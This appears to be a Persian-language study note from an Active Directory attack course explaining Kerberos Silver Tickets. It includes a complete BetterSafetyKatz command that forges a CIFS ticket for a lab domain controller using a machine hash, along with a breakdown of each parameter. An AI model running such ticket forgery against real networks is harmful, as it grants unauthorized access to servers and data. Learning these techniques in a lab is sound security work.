
[[ECPPT/Active Directory/Silver Ticket|Silver Ticket]] ---> ECPPT
[[AD/Attacking Active Directory/Silver Ticket|Silver Ticket]]---> Attacking Active Directory




---

### **ترجمه متن**

- با استفاده از **hash حساب کامپیوتر Domain Controller**، دستور زیر **دسترسی به فایل‌سیستم روی DC** را فراهم می‌کند:
    

```text
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User: Administrator /domain: dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service: CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin: 600 /renewmax:10080 /ptt" "exit"
```

- دستور مشابه را می‌توان برای **سرویس‌های دیگر روی یک ماشین** هم استفاده کرد:
    
    - مثال‌ها: `HOST`, `RPCSS`, `HTTP` و بسیاری سرویس‌های دیگر.
        

> این روش برای ساخت **Silver Ticket** و دسترسی به سرویس‌ها با استفاده از **hash حساب کامپیوتر** کاربرد دارد.

---

### **تحلیل خلاصه و نکات کلیدی برای جزوه**

1. **Silver Ticket چیست؟**
    
    - تیکتی است که برای **یک سرویس خاص روی یک کامپیوتر** صادر می‌شود، بر خلاف Golden Ticket که دامنه را پوشش می‌دهد.
        
    - با استفاده از Silver Ticket می‌توان به سرویس‌های شبکه بدون تماس با **Domain Controller** دسترسی پیدا کرد.
        
2. **پارامترهای مهم دستور:**
    
    - `/User: Administrator` → کاربر هدف برای تیکت
        
    - `/domain: dollarcorp.moneycorp.local` → دامنه
        
    - `/target: dcorp-dc.dollarcorp.moneycorp.local` → سرویس/ماشین هدف
        
    - `/service: CIFS` → سرویسی که می‌خوای بهش دسترسی پیدا کنی (مثلاً فایل‌سیستم)
        
    - `/rc4:<hash>` → hash کامپیوتر یا کاربر برای ساخت تیکت
        
    - `/ptt` → تیکت ساخته شده را **همین لحظه در سیستم جاری inject کند**
        
3. **کاربرد:**
    
    - دسترسی به فایل‌ها، سرویس‌ها یا منابع شبکه بدون نیاز به Domain Admin واقعی.
        
    - قابل استفاده برای سرویس‌های مختلف مثل: **HOST, RPCSS, HTTP, CIFS و …**
        

---

💡 نکته برای جزوه:

> **Golden Ticket** → دامنه را پوشش می‌دهد و دسترسی Domain Admin می‌دهد  
> **Silver Ticket** → سرویس خاص روی یک ماشین را پوشش می‌دهد و با hash کامپیوتر ساخته می‌شود

---

### **ساخت Silver Ticket با هش حساب سرویس**

1. **گرفتن هش حساب سرویس**
    
    - هر سرویس در ویندوز یک **Computer Account** یا **Service Account** دارد.
        
    - با ابزارهایی مثل **Mimikatz / SafetyKatz / BetterSafetyKatz** می‌توان **hash NTLM یا RC4** این حساب‌ها را استخراج کرد.
        
2. **ساخت Silver Ticket**
    
    - با استفاده از این hash، می‌توان یک **Kerberos Ticket برای سرویس مشخص** ساخت.
        
    - دستور نمونه:



![[Pasted image 20250909012002.png]]
